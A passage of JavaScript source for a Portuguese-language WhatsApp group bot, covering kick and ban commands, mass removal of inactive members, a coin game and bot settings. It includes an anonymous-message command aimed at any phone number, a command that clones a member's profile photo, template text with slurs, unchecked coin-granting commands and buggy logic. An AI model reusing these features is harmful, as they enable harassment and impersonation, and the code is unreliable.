conn.groupParticipantsUpdate(from, [menc_jid], "remove")
}
break

case 'ban': case 'banir': case 'kick':  
if(menu_audio === true) {
audiomenu = await fs.readFileSync("./audios/ban2.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
}
if(!isGroupAdmins && !SoDono) return reply('Só ADM pode utilizar este comando.')
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
try {
if(!budy.includes("@")) {
if (info.message.extendedTextMessage == undefined || info.message.extendedTextMessage == null) return reply(`Marque a mensagem do usuário que deseja remover ele ou marque com ${prefix}ban @marcar-ele`)
if(!JSON.stringify(groupMembers).includes(menc_prt)) return reply("Este usuário já foi removido do grupo.")
if(botNumber.includes(menc_prt)) return reply('Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você')
if(numerodono.includes(menc_prt)) return reply('Não posso remover meu dono 🤧')
conn.sendMessage(from, {text: `@${menc_prt.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) -`, mentions: [menc_prt]})
conn.groupParticipantsUpdate(from, [menc_prt], "remove")  
} else {
if(q.length > 15) return reply('Só pode remover uma pessoa por vez..')
if(botNumber.includes(menc_jid)) return reply('Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você')
if(numerodono.includes(menc_jid)) return reply('Não posso remover meu dono 🤧')
if(!JSON.stringify(groupMembers).includes(menc_jid)) return reply("Este usuário já foi removido do grupo.")
conn.sendMessage(from, {text: `@${menc_jid.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) - `, mentions: [menc_jid]})
conn.groupParticipantsUpdate(from, [menc_jid], "remove")
}
} catch (e) {
console.log(e)
}
break

//======≠(INFOS/EXECUÇÃO/DONO)≠=========\\

case 'papof':
case 'regraspp':  
if(!isGroupAdmins) return reply('Qual foi membro comum?')
txtz = `【᯽𒋨📷:𝑆𝑒 𝑎𝑝𝑟𝑒𝑠𝑒𝑛𝑡𝑒𝑚 𝑙𝑖𝑥𝑜𝑠🌚»°】
𒋨·࣭࣪̇🔥ɴᴏᴍᴇ:
𒋨·࣭࣪̇🔥ɪᴅᴀᴅᴇ:
𒋨·࣭࣪̇🔥ʀᴀʙᴀ:
*Aᴘʀᴇsᴇɴᴛᴇ-sᴇ sᴇ ǫᴜɪsᴇʀ.*
𝙏𝘼𝙂𝙎➭᜔ׂ࠭ ⁸₈⁸|𝟖𝟖𝟖|𝟠𝟠𝟠| ེི⁸⁸⁸
 ──╌╌╌┈⊰★⊱┈╌╌╌┈─
❌ ENTROU NO 
GRUPO INTERAJA, NÃO PRECISAMOS DE ENFEITES,INATIVOS SERAO REMOVIDOS ❌* 

/﹋<,︻╦╤─ ҉ - -----💥 
/﹋ 🅴 🅱🅴🅼 🆅🅸🅽🅳🅾 🆂🅴🆄🆂 🅵🅸🅻🅷🅾🆂 🅳🅰 🅿🆄🆃🅰`
conn.sendMessage(from, {text: txtz}, {quoted: selo})
break

case 'digt':
bla = `🔥↯𝐉𝐀 𝐄𝐍𝐓𝐑𝐀 𝐃𝐈𝐆𝐈𝐓𝐀𝐍𝐃𝐎 𝚽𝐈 ↯°🌚💕
           ི⋮ ྀ🌴⏝ ི⋮ ྀ🚸 ི⋮ ྀ⏝🌴 ི⋮ ྀ 

🐼🍧↯𝖠𝖰𝖴𝖨 𝖵𝖮𝖢𝖤̂ 𝖯𝖮𝖣𝖤 𝖲𝖤𝖱↯🍧🐻
ㅤㅤㅤㅤ  ◍۫❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ⟅◌ٜ🛸◌⟆࣭࣭ٜ໑⃕ꔷ⃘࣭࣭࣭࣭ٜ❀۫◍ི࣭࣭࣭࣭ ུ
    【✔】ᴘʀᴇᴛᴀ👩🏾‍🦱 【✔】ʙʀᴀɴᴄᴀ👩🏼
    【✔】ᴍᴀɢʀᴀ🍧【✔】ɢᴏʀᴅᴀ🍿
    【✔】ᴘᴏʙʀᴇ🪙 【✔】ʀɪᴄᴀ💳
    【✔】ʙᴀɪᴀɴᴀ💌【✔】ᴍᴀᴄᴏɴʜᴇɪʀᴀ🍁
    【✔】ᴏᴛᴀᴋᴜ🧧【✔】ᴇ-ɢɪʀʟ🦄
    【✔】ʟᴏʟɪ🍭    【✔】ɢᴀᴅᴏ🐃
    【✔】ɢᴀʏ🏳️‍🌈     【✔】ʟᴇsʙɪᴄᴀ✂️
    【✔】ᴠᴀᴅɪᴀ💄  【✔】ᴛʀᴀᴠᴇᴄᴏ🍌
                【✔】ɴɪɴɢᴜᴇᴍ ʟɪɢᴀ📵
. ☪︎ • ☁︎. . •.
【 𝐕𝐄𝐌 𝐆𝐀𝐋𝐄𝐑𝐀, 𝐒𝐄 𝐃𝐈𝐕𝐄𝐑𝐓𝐈𝐑 𝐄 𝐅𝐀𝐙𝐄𝐑 𝐏𝐀𝐑𝐓𝐄 𝐃𝐀 𝐅𝐀𝐌𝐈𝐋𝐈𝐀.】🥂`
conn.sendMessage(from, {text: bla}, {quoted: selo})
break

case 'listban':
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins) return reply(enviar.msg.adm)
var ind = dbids.indexOf(from)
if(!JSON.stringify(adeuscara).includes(from)) return reply('*Nenhum Número não foi adicionado*')
teks = '*Números que vou moer na porrada se voltar 😡:*\n'
for(i=0;i<adeuscara[ind].number.length;++i) {
teks += `➤ *${adeuscara[ind].number[i]}*\n`
}
teks += '*Esses ai vou descer meu martelo do ban 🥵*'
reply(teks)
break  

case 'listagp': //case by: Bielzinho-Bot
if (!SoDono && !isnit && !info.key.fromMe) return reply('```SOMENTE MEU DONO LINDÃO```')
var getGroups = await conn.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)

teks1 = `*LISTA DE GRUPOS*\n*Total de Grupos* : ${ingfoo.length}\n\n`
for (let i = 0; i < ingfoo.length; i++){
teks1 += `• *Nome do Grupo* : ${ingfoo[i].subject}\n• *Id do Grupo* : ${ingfoo[i].id}\n• *Criado* : ${moment(`${ingfoo[i].creation}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}\n• *Total de Membros* : ${ingfoo[i].participants.length}\n\n`
}
reply(teks1)
break

case 'addautorm':
case 'addautoban':
case 'listanegra':  
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if(!budy.includes(" ")) {
if(!info.message?.extendedTextMessage?.contextInfo?.participant
) return reply("Marque a mensagem do usuário que deseja add na lista negra, ou coloque o número da fórma que copiou de dados do usuário.")  
var mentioned = info.message?.extendedTextMessage?.contextInfo?.participant

var ind = dbids.indexOf(from)
if(JSON.stringify(adeuscara).includes(from)) {
var numind = adeuscara[ind].number.indexOf(`${mentioned.split("@")[0]}`)
if(numind >= 0) return reply('*Esse Número ja esta incluso*')
adeuscara[ind].number.push(`${mentioned.split("@")[0]}`)
} else {
adeuscara.push({
groupId: from,
actived: false,
number: [`${mentioned.split("@")[0]}`]
})
}
fs.writeFileSync('./datab/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`*Número adicionado a lista de autoban*`)
} else {
if (args.length < 1) return reply('Cade o número?')
var ind = dbids.indexOf(from)
if(JSON.stringify(adeuscara).includes(from)) {
listng = q.replace(new RegExp("[()+-/ +/]", "gi"), "")  
var numind = adeuscara[ind].number.indexOf(listng)
if(numind >= 0) return reply('*Esse Número ja esta incluso*')
adeuscara[ind].number.push(listng)
} else {
listng = q.replace(new RegExp("[()+-/ +/]", "gi"), "")    
adeuscara.push({
groupId: from,
actived: false,
number: [listng]
})
}
fs.writeFileSync('./datab/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`*Número adicionado a lista de autoban*`)
}
break

case 'delremover':
case 'delautorm':  
case 'delautoban': 
case 'tirardalista':  
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Diga o numero sem espaço, + ou traço')
if (isNaN(args[0])) return reply('Diga o numero sem espaço, + ou traço')
var ind = dbids.indexOf(from)
if(!JSON.stringify(adeuscara).includes(from)) return reply('*Nenhum Número não foi adicionado*')
var numind = adeuscara[ind].number.indexOf(args[0])
if(numind < 0) return reply('*Esse número não está incluso*')
adeuscara[ind].number.splice(numind, 1)
fs.writeFileSync('./datab/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`*Número removido a lista de autoban*`)
break

case 'banghost':
case 'banghosts':  
if(!isGroup) return reply(enviar.msg.grupo)  
if(!SoDono && !isnit) return reply("Só dono pode executar este comando..")
if (!isBotGroupAdmins) return reply('Bot precisa ser ADM, para executar esta função.')
if(q.length < 1) return reply(`Exemplo: ${prefix}banghosts 0\n\nEle vai banir todos aqueles que tá com 0 mensagens, mas faça isso apenas se passou um tempo com o bot armazenando mensagem dos membros ativos do grupo.`)
if(groupIdscount.indexOf(from) >= 0) {
for(let obj of groupMembers) {
if(numbersIds.indexOf(obj.id) >=0) { 
var indnum = numbersIds.indexOf(obj.id)
if(countMessage[ind].numbers[indnum].messages <= args[0]) {
if(groupAdmins.includes(obj.id)) {
mentions(`@${obj.id} ta liberado da inspeção por ser admin`, [obj.id], true)
} else {
setTimeout(async() => {
conn.groupParticipantsUpdate(from, [obj.id], 'remove')
}, 1000)
}
}
} else {
if(groupAdmins.includes(obj.id)) {
mentions(`@${obj.id} ta liberado da inspeção por ser admin`, [obj.id], true)
} else {
setTimeout(async() => {
conn.groupParticipantsUpdate(from, [obj.id], 'remove')
}, 1000)
}
}
}
}
break
case 'apostar':{//by Joabe
if (!isGroup) return reply('*_Comando apenas para grupo_*') 
const dinheiro = checkATMuser(sender)
const checkxpr = checkATMuser(sender, dinheiro) 
const quantidader = `50`
if (checkxpr <= quantidader) return reply(`desculpe vc ainda não  pode apostar😕 somente com  ${quantidader} de GOLD.\n\nSuas Coins: ${checkxpr}`)
if (Number(args[0]) >= checkxpr || Number(args[0]) >= dinheiro) return reply(`Você não pode apostar uma quantidade de dinheiro maior do que a você tem, e nosso limite de apostas é de ${quantidader} dinheiro por vez!\n\nSeu dinheiro: ${checkxpr}`)
if (Number(args[0]) < 1) return reply(`O m`)
if (isNaN(args[0])) return reply(`*digite "${prefix}apostar valor" desse jeito*`)
const double = Math.floor(Math.random() * 7) + 1
const nrolxp = Number(-args[0])
const prolxp = double + Number(args[0])
if (double == 2) {
await reply(`🔪BANG!!!💣\n\nVocê perdeu na roleta-russa, causando uma perca de ${nrolxp} em seu dinheiro.`)
addKoinUser(sender, nrolxp, dinheiro)
addKoinUser(`0@s.whatsapp.net`, prolxp)
} else if (double == 2) {
await reply(`*_Você Ganhou🥳\nSobreviveu ao tiro e recebeu ${prolxp} GOLD_*`)
addKoinUser(sender, prolxp, dinheiro)
} else if (double == 3) {
await reply(`Poxa você está sem sorte😓\n\nVocê perdeu ${nrolxp}\não desista continue apostando😎🤙`)
addKoinUser(sender, nrolxp, dinheiro)
addKoinUser(`0@s.whatsapp.net`, prolxp)
} else if (double == 4) {
await reply(`Essa foi por pouco!!😬\n\nVocê consegiu concluir o golpe e ganhou ${prolxp} GOLD`)
addKoinUser(sender, prolxp, dinheiro)
} else if (double == 5) {
await reply(`Você errou o cavalo️\n\nAcabou perdendo ${nrolxp} em seu dinheiro, que tal..apostar mais alto??🤫.`)
addKoinUser(sender, nrolxp, dinheiro)
addKoinUser(`${numerodono}@s.whatsapp.net`, prolxp)
} else if (double == 6) {
await reply(`🥳Aeeeeee🥳\n\nVocê finalmente ganhou, receba seus ${prolxp} de GOLD🔷️`)
addKoinUser(sender, prolxp, dinheiro)
}
}
break
case 'addcoin10000000':
addKoinUser(sender, 10000)
addKoinUser(`0@s.whatsapp.net`)
reply(`⚔️ *parabéns o ${q} Ganhou concluído 10K de dinheiro somente para você* `)
conn.sendMessage(from, {quoted: selo})
break
case 'gerarcodigo10':
if(!SoDono) return reply("Você não é dono para utilizar este comando...")
reply(`📌 *codigo:* ${prefix}jfod7ghnchi866`)
conn.sendMessage(from, {image: bufferImg}, {quoted: selo});
break
case 'gerarcodigo10000':
if(!SoDono) return reply("Você não é dono para utilizar este comando...")
reply(`📌 *codigo:* ${prefix}jfodghnchiivbg66`)
conn.sendMessage(from, {image: bufferImg}, {quoted: selo});
break
case 'jfod7ghnchi866':

addKoinUser(sender, 50)

reply("🔗so pode utilizar esse código uma vez🌟\n\n⚔️ *parabéns resgate concluído 50 de dinheiro para você* ")

conn.sendMessage(from, {image: bufferImg}, {quoted: selo})

break
case 'jfodghnchiivbg66':
addKoinUser(sender, 10000)
reply("🔗so pode utilizar esse código uma vez🌟\n\n⚔️ *parabéns resgate concluído 10K de dinheiro para você* ")
conn.sendMessage(from, {image: bufferImg}, {quoted: selo})
break

case 'buyprem':{
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
const dattaa = moment.tz('America/Sao_Paulo').format('DD/MM/YY');
const nrolxp = Number(-args[1000])
const dinheiro = checkATMuser(sender)
const checkxpr = checkATMuser(sender, dinheiro) 
const quantidader = `1000`
if (checkxpr <= quantidader) return reply(`[❗] Desculpe ${pushname} você não tem dinhero suficiente\nvalor do premium: 1000 mil`)
premium.push(`${sender}`)
fs.writeFileSync('./datab/usuarios/premium.json', JSON.stringify(premium))
await reply(`*き⃟👻✰͜͡𝐂𝚯͢𝐌𝐏𝐑͢𝐀 𝐁𝚵͢𝐌 𝐒️𝐔𝐂𝚵͢𝐃𝐈𝐃𝐀👻️⃟き*\n\nき⃟👤️͢𝐕𝐄𝐍𝐃𝚵͢𝐃𝚯͢𝐑 : *${NomeDoBot}*\nき⃟🏷️𝐂𝚯͢͢𝐌𝐏𝐑͢𝐀𝐃𝚯͢͢𝐑 : *${pushname}*\nき⃟💱𝐏𝐑𝚵͢Ç𝐎 𝐃͢͢𝚯 𝐏𝐑𝚵͢𝐌𝐈𝐔𝐌: *${quantidader}*\nき⃟📆𝐃͢͢𝐀𝐓͢𝐀: *${dattaa}*\nき⃟🕒𝐇𝐎𝐑𝐀: *${hora1}`)
}
addKoinUser(sender, nrolxp, dinheiro)
break
/*👻⛦𝐏͢𝚵𝐋͢𝐀 𝐅͢𝚵𝐋͢𝐈𝐂͢𝐈𝐃𝐀͢𝐃𝚵͢ 𝐃𝚯͢ 𝐃𝐈͢𝐀𝐁͢𝚯⛦👻
𝐏𝐑𝐄Ç𝐎 𝐃𝐎 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐕𝐄𝐍𝐃𝐄𝐃𝐎𝐑 𝐂𝐎𝐌𝐏𝐑𝐀𝐃𝐎𝐑 𝐃𝐀𝐓𝐀 𝐇𝐎𝐑𝐀*/
case 'addsaldo100': 
addKoinUser(sender, 100)
reply(`*𝐎𝐋͢𝜟 𝐅͢𝚯͢𝐈 𝐀𝐃𝐈𝐂𝐈͢𝜟𝐃𝚯͢ 100 𝐃𝚵͢ 𝐒𝐀𝐋͢𝐃𝚯 𝐏͢𝜟𝐑͢𝜟 𝐕𝚯͢𝐂͢𝚵 𝐃𝐈͢𝐕𝐈𝐑𝐓͢𝜟-𝐒͢𝚵*`)
break
case 'addsaldo1000': 
addKoinUser(sender, 1000)
reply(`𝐎𝐋͢𝜟 𝐅͢𝚯͢𝐈 𝐀𝐃𝐈𝐂𝐈͢𝜟𝐃𝚯͢ 1000 𝐃𝚵͢ 𝐒𝐀𝐋͢𝐃𝚯 𝐏͢𝜟𝐑͢𝜟 𝐕𝚯͢𝐂͢𝚵 𝐃𝐈͢𝐕𝐈𝐑𝐓͢𝜟-𝐒͢𝚵* `)
break
case 'addsaldo10000':
addKoinUser(sender, 10000)
reply(`𝐎𝐋͢𝜟 𝐅͢𝚯͢𝐈 𝐀𝐃𝐈𝐂𝐈͢𝜟𝐃𝚯͢ 10000 𝐃𝚵͢ 𝐒𝐀𝐋͢𝐃𝚯 𝐏͢𝜟𝐑͢𝜟 𝐕𝚯͢𝐂͢𝚵 𝐃𝐈͢𝐕𝐈𝐑𝐓͢𝜟-𝐒͢𝚵`)
break
case 'addsaldo100000':
addKoinUser(sender, 100000)
reply(`𝐎𝐋͢𝜟 𝐅͢𝚯͢𝐈 𝐀𝐃𝐈𝐂𝐈͢𝜟𝐃𝚯͢ 100000 𝐃𝚵͢ 𝐒𝐀𝐋͢𝐃𝚯 𝐏͢𝜟𝐑͢𝜟 𝐕𝚯͢𝐂͢𝚵 𝐃𝐈͢𝐕𝐈𝐑𝐓͢𝜟-𝐒͢𝚵`)
break
case 'addsaldo1000000': 
addKoinUser(sender, 1000000)
reply(`𝐎𝐋͢𝜟 𝐅͢𝚯͢𝐈 𝐀𝐃𝐈𝐂𝐈͢𝜟𝐃𝚯͢ 1000000 𝐃𝚵͢ 𝐒𝐀𝐋͢𝐃𝚯 𝐏͢𝜟𝐑͢𝜟 𝐕𝚯͢𝐂͢𝚵 𝐃𝐈͢𝐕𝐈𝐑𝐓͢𝜟-𝐒͢𝚵`)
break
case 'addsaldo10000000': 
addKoinUser(sender, 10000000)
reply(`𝐎𝐋͢𝜟 𝐅͢𝚯͢𝐈 𝐀𝐃𝐈𝐂𝐈͢𝜟𝐃𝚯͢ 10000000 𝐃𝚵͢ 𝐒𝐀𝐋͢𝐃𝚯 𝐏͢𝜟𝐑͢𝜟 𝐕𝚯͢𝐂͢𝚵 𝐃𝐈͢𝐕𝐈𝐑𝐓͢𝜟-𝐒͢𝚵`)
break
case 'addsaldo100000000':
addKoinUser(sender, 100000000)
reply(`𝐎𝐋͢𝜟 𝐅͢𝚯͢𝐈 𝐀𝐃𝐈𝐂𝐈͢𝜟𝐃𝚯͢ 100000000 𝐃𝚵͢ 𝐒𝐀𝐋͢𝐃𝚯 𝐏͢𝜟𝐑͢𝜟 𝐕𝚯͢𝐂͢𝚵 𝐃𝐈͢𝐕𝐈𝐑𝐓͢𝜟-𝐒͢𝚵`)
break
case 'addsaldo1000000000':
addKoinUser(sender, 1000000000)
reply(`𝐎𝐋͢𝜟 𝐅͢𝚯͢𝐈 𝐀𝐃𝐈𝐂𝐈͢𝜟𝐃𝚯͢ 1000000000 𝐃𝚵͢ 𝐒𝐀𝐋͢𝐃𝚯 𝐏͢𝜟𝐑͢𝜟 𝐕𝚯͢𝐂͢𝚵 𝐃𝐈͢𝐕𝐈𝐑𝐓͢𝜟-𝐒͢𝚵`)

break

case 'saldo'://by joabe
var salldo = checkATMuser(sender) 
const dinheiro = checkATMuser(sender)
const checkxpr = checkATMuser(sender, dinheiro) 
const limite = {salldo}
if (limite < 100000 ) {status = 'Classe média'} else if (limite == 1000000 ) {status = 'Milionário'} else if (limite == 1000000000 ) {status = 'Bilionário'} 
else if (limite == 100000 ) {status = 'Classe pobre'}
//╰──────────╮╭──────────╯
pinga = `
┏━──────「💠」──────━┓
│ㅤㅤ    ✰͜͡𝐒𝐀𝐋𝐃𝐎 𝐂𝐎𝐈𝐍𝐒
┗━─────╮
┏━─────╯
│『👤』 *✰͜͡NOME: ${pushname}*
│『🏛️』 *✰͜͡BANCO: COIN*
│『💹』 *✰͜͡DINHEIRO: ${dinheiro}*
│『🟢』 *✰͜͡STATUS: ✅*
│『🤖』 *✰͜͡BOT: ${NomeDoBot}*
│『💎』 *✰͜͡PREMIUM: ${isPremium ? "✅" : "❌"}*
┗━──────「💠」──────━┛
`

await conn.sendMessage(from, {text: pinga, footer: `Caso queira apostar digite apostar (valor)`, buttons: [{buttonId: `${prefix}menusaldo`, buttonText: {displayText: '『🪓』✰͜͡𝐌𝐈𝐍𝐄𝐑𝐀𝐑'}, type: 1}, {buttonId: `${prefix}buyprem`, buttonText: {displayText: '『🪙』✰͜͡𝐂𝐎𝐌𝐏𝐑𝐀𝐑 𝐏𝐑𝐄𝐌𝐈𝐔𝐌'}, type: 1}]}, {quoted: info})
break
     case 'addsaldo':
if(!SoDono) return reply("Você não é dono para utilizar este comando...")  
txt = body.slice(10)
txtt = args.join(" ")
txt1 = txt.split("|")[0];
txt2 = txtt.split("|")[1];
if(!txt) return reply('Cade o número da pessoa?')
if(!txtt) return reply('Cade a mensagem do correio??')
if(txt.includes("-")) return reply('Tem que ser o número junto sem +, e não pode tá separado da /')
if(txtt.includes("+")) return reply('Tem que ser o número junto sem +, e não pode tá separado da /')
if(!txtt.includes("|")) return reply(`Exemplo: ${prefix}correio 558198923680/Oi Amor, sdds`)
bla = 
`${txt2}
`
conn.sendMessage(`${txt1}@s.whatsapp.net`, {text: bla}, {quoted: selo})
break


case 'correio':
txt = body.slice(10)
txtt = args.join(" ")
txt1 = txt.split("/")[0];
txt2 = txtt.split("/")[1];
if(!txt) return reply('Cade o número da pessoa?')
if(!txtt) return reply('Cade a mensagem do correio??')
if(txt.includes("-")) return reply('Tem que ser o número junto sem +, e não pode tá separado da /')
if(txtt.includes("+")) return reply('Tem que ser o número junto sem +, e não pode tá separado da /')
if(!txtt.includes("/")) return reply(`Exemplo: ${prefix}correio 558198923680/Oi Amor, sdds`)
bla = 
`╭┄━┄━┄━┄━┄━╮
┞┧ ⸙. ͎۪۫          💌  ː͡₊ꞋꞌꞋꞌ
┞┧Correio anônimo. 
┞┧Msg: ${txt2}
┞┧
╰┄━┄━┄━┄━┄━╮`
conn.sendMessage(`${txt1}@s.whatsapp.net`, {text: bla})
break

case 'nome-bot':
if (!SoDono  && !isnit && !info.key.fromMe) return reply(enviar.msg.donosmt)  
NomeDoBot = args.join(" ") 
setting.NomeDoBot = NomeDoBot
fs.writeFileSync('./dono/settings.json', JSON.stringify(setting, null, '\t'))
reply(`O nome do seu bot foi alterado com sucesso para : ${setting.NomeDoBot}`)
break

case 'nick-dono':
if (!SoDono  && !isnit && !info.key.fromMe) return reply(enviar.msg.donosmt)  
NickDono = args.join(" ")
setting.NickDono = NickDono
fs.writeFileSync('./dono/settings.json', JSON.stringify(setting, null, '\t'))
reply(`O Nick Do Dono foi configurado para : ${setting.NickDono}`)
break

case 'numero-dono':
if (!SoDono && !isnit && !info.key.fromMe) return reply(enviar.msg.donosmt)  
reply(`O número dono foi configurado com sucesso para : ${q}\n\n_ REINICIANDO EM 3. 2 . 1`)
numerodonoofc = setting.numerodono 
numerodonoofc = args.join(" ")
setting.numerodono = numerodonoofc
fs.writeFileSync('./dono/settings.json', JSON.stringify(setting, null, '\t'))
break

case 'prefixo-bot': case 'setprefix':
if (args.length < 1) return
if (!SoDono  && !isnit && !info.key.fromMe) return reply(enviar.msg.donosmt)
prefix = args[0]
setting.prefix = prefix
fs.writeFileSync('./dono/settings.json', JSON.stringify(setting, null, '\t'))
reply(`O prefixo foi alterado com sucesso para: ${setting.prefix}`)
break

case 'up':
if(!q.includes("1") && !q.includes("0")) return reply(`Utilize 1 para ativar ou 0 para desativar\n\nExemplo: ${prefix}up 1\n\nExemplo: ${prefix}up 0`)
if(!SoDono) return reply("Apenas dono") 
if(q == 1) {
reply(`on`)
fs.writeFileSync(`./func/autorepo/autorepo_${from}.json`, JSON.stringify([], null, 2))
}

if(q == 0) {
reply(`off`)
fs.unlinkSync(`./func/autorepo/autorepo_${from}.json`)  
}
break

case 'prefixo_tipo2':
case 'prefixo_tipo_off':  
if (!SoDono  && !isnit) return reply(enviar.msg.donosmt)
if(budy.includes(`prefixo_tipo2`)) {
if(args.length < 1) return reply(`Digite o prefixo que deseja :\nExemplo: ${prefix}prefixo_tipo2 -`)    
var prefixo2_ = {
prefixo: q
}
if(!fs.existsSync(`./func/prefixo/prefixo2_${from}.json`)) {
fs.writeFileSync(`./func/prefixo/prefixo2_${from}.json`, JSON.stringify(prefixo2_, null, 2))
reply(`Prefixo único só para este grupo foi criado com sucesso..\n\n Prefixo: ${q}`)
} else {
fs.unlinkSync(`./func/prefixo/prefixo2_${from}.json`) 
fs.writeFileSync(`./func/prefixo/prefixo2_${from}.json`, JSON.stringify(prefixo2_, null, 2))
reply(`Prefixo re-criado com sucesso de : ${prefixo2_on.prefixo} para : ${q}`)
}
} else if(budy.includes("prefixo_tipo_off")) {
if(!fs.existsSync(`./func/prefixo/prefixo2_${from}.json`)) return reply(`Já está no prefixo original do bot, que é : ${setting.prefix}`)
fs.unlinkSync(`./func/prefixo/prefixo2_${from}.json`)  
reply(`Parabéns, voltou ao prefixo original : ${setting.prefix}`)
}
break

case 'fotomenu':
case 'fundomenu':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if(!isQuotedImage) return reply("Marque uma imagem")
reply('Você deve marcar uma imagem 2 vez com esse comando..')
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
imagem = await downloadContentFromMessage(boij, 'image')
owgi = Buffer.from([])
for await(const send of imagem) { owgi = Buffer.concat( [ owgi, send ] ) }
res = await upload(owgi)
logoslink.logo = logo
logo = res
fs.writeFileSync('./logos/logos.json', JSON.stringify(logoslink, null, '\t'))
reply(`A foto do  foi alterada com sucesso para: ${logo}`)
} else {
reply(`Mande uma imagem/vídeo com a legenda ${prefix + command}`)
}
break

case 'setprefixs':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
prefix = args[0]
setting.prefix = prefix
fs.writeFileSync('./dono/settings.json', JSON.stringify(setting, null, '\t'))
reply(`O prefixo foi alterado com sucesso para: ${prefix}`)
break

case 'nomegp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
await conn.groupUpdateSubject(from, `${body.slice(9)}`)
await conn.sendMessage(from, {text: 'Sucesso, alterou o nome do grupo'}, {quoted: info})
break

case 'fotobot':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!isQuotedImage) return reply(`Envie fotos com legendas ${prefix}fotobot ou tags de imagem que já foram enviadas`)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
await conn.updateProfilePicture(botNumber, buff)
reply('Obrigado pelo novo perfil😗')
break

case 'clonar':
if (!SoDono  && !isnit && !issupre && !ischyt) return reply('Você quem é o proprietário?')
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Marque a pessoa que você quer clonar\n\n*EXEMPLO:* clone @')
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Tag cvk')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, id, notify } = groupMembers.find(x => x.id === mentioned)
try {
pp = await conn.profilePictureUrl(id)
buffer = await getBuffer(pp)
conn.updateProfilePicture(botNumber, buffer)
mentions(`Foto do perfil atualizada com sucesso, usando a foto do perfil @${id.split('@')[0]}`, [id], true)
} catch (e) {
reply('Putz, deu erro, a pessoa deve estar sem foto 😔')
}
break
case 'leveling':
if (!isGroup) return reply('Só em Grupo')
if (!isGroupAdmins) return reply('Você precisa ser adm')
if (args.length < 1) return reply('Ative pressione 1, Desativar pressione 0')
if (Number(args[0]) === 1) {
if (isLevelingOn) return reply('*O recurso de nível já estava ativo antes*')
_leveling.push(from)
fs.writeFileSync('./datab/usuarios/leveling.json', JSON.stringify(_leveling))
reply(enviar.levelon) 
} else if (Number(args[0]) === 0) {
if (!isLevelingOn) return reply(`O recurso de level já está Desativado neste grupo.`)
_leveling.splice(from, 1)
fs.writeFileSync('./datab/usuarios/leveling.json', JSON.stringify(_leveling))
reply(enviar.leveloff)
} else {
reply('「* Adicionar parâmetro 1 ou 0 ')
}
break

case 'level':
if (!isLevelingOn) return reply(`_*ᬊ᭄𝐎 𝐒𝐈𝐒𝐓𝐄𝐌𝐀 𝐃𝐄 ??𝐏 𝐄𝐒𝐓𝐀 𝐃𝐄𝐒𝐀𝐁𝐈𝐋𝐈𝐓𝐀𝐃𝐎, 𝐏𝐀𝐑𝐀 𝐀𝐓𝐈𝐕𝐀𝐑 𝐅𝐀𝐋𝐄 𝐂𝐎𝐌 𝐔𝐌 𝐀𝐃𝐌 𝐄 𝐃𝐈𝐆𝐈𝐓𝐄: ${prefix}leveling 1  ᬊ᭄*_ `)
if (!isGroup) return reply(enviar.msg.grupo)
const userLevel = getLevelingLevel(sender)
const userXp = getLevelingXp(sender)
if (userLevel === undefined && userXp === undefined) return reply(enviar.levelnol)
sem = sender.replace('@s.whatsapp.net','')
try {
ppimg = await conn.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
buffer = await getBuffer(ppimg)
sem = sender.replace('@s.whatsapp.net','')
                resul = `
┏┉┉━═『✯✯✯✯✯』═━┉┉┓
⎊           𖠌𝙻𝙴𝚅𝙴𝙻𝙸𝙽𝙶𖠌           ⎊                                                                                        
┗┉┉━═『✯✯✯✯✯』═━┉┉┛
║│⿻͜͡ ✑❲𝙽𝚘𝚖𝚎❳:
║│${pushname}
║│⿻͜͡ ✑ ❲𝙽𝚞́𝚖𝚎𝚛𝚘❳: ${sender.split("@s.whatsapp.net")[0]} 
║│
║│⿻͜͡ ✑ ❲𝚇ᴘ❳: ${userXp}
║│
║│⿻͜͡ ✑ ❲𝙻ᴇᴠᴇʟ❳ : ${userLevel}
║│
║│⿻͜͡ ✑ ❲𝙿ᴀᴛᴇɴᴛᴇ❳ :
║│${patt}
║╰──────────────┓
